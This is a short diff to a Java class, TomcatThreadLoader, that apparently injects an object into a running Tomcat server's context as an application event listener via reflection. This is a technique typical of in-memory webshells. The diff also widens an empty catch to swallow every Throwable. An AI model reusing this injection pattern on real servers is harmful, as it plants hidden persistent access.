@@ -63,7 +63,7 @@ public class TomcatThreadLoader {
                 inject(standardContext, object);
             }
 
-        } catch (Exception e) {
+        } catch (Throwable e) {
 
         }
     }
@@ -111,7 +111,7 @@ public class TomcatThreadLoader {
 //        }
 //        return false;
 //    }
-//
+
 //    public static void inject(Object standardContext, Object object) throws Exception {
 //        if (applicationEventListenersObjects != null) {
 //            // 5 6
@@ -123,7 +123,7 @@ public class TomcatThreadLoader {
 //            // 7 8 9 10
 //            invokeMethod(standardContext, "addApplicationEventListener", new Class[]{Object.class}, new Object[]{object});
 //        }
-//        flag = true;
+//        flag = new Boolean(true);
 //    }
 
     // tools
